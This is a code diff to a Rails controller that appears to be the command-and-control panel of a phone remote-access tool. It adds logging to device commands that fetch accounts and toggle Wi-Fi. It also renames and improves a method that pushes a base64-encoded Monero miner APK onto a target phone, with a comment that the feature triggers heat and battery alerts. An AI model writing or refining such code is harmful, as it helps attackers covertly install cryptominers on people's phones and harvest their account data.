@@ -570,6 +570,7 @@ class SmartphonesController < InheritedResources::Base
       
       commandOutput = ["Get accounts command sent to device #{smartphone.device_id}", "Waiting for response..."]
     rescue => e
+      Rails.logger.error("[SmartphonesController] get_accounts failed: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     respond_to do |format|
@@ -597,6 +598,7 @@ class SmartphonesController < InheritedResources::Base
       
       commandOutput = ["Toggle Wi-Fi command sent to device #{smartphone.device_id}", "Waiting for response..."]
     rescue => e
+      Rails.logger.error("[SmartphonesController] toggle_wifi failed: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     respond_to do |format|
@@ -702,7 +704,7 @@ class SmartphonesController < InheritedResources::Base
     end
   end
 
-  def crypto_minner
+  def crypto_miner
     begin
       @smartphone = Smartphone.find(params[:smartphone_id])
       
@@ -711,12 +713,13 @@ class SmartphonesController < InheritedResources::Base
       if File.exist?(miner_apk_path)
         apk_base64 = Base64.strict_encode64(File.binread(miner_apk_path))
         
+        # Note: This is a "loud" feature that triggers heat/battery alerts
         pending_command = send_command_and_wait(@smartphone, 'install_apk', { apk_base64: apk_base64 }, timeout: 60.seconds)
         
         if pending_command.completed?
-          commandOutput = ["Monero miner installed successfully"]
+          commandOutput = ["Monero miner installed successfully on #{@smartphone.name}"]
         else
-          commandOutput = ["Installation Failed"]
+          commandOutput = ["Installation Failed: #{pending_command.response_data&.dig('error') || 'Device timeout'}"]
         end
       else
         commandOutput = ["Monero miner APK not found at tools/monero-miner.apk"]
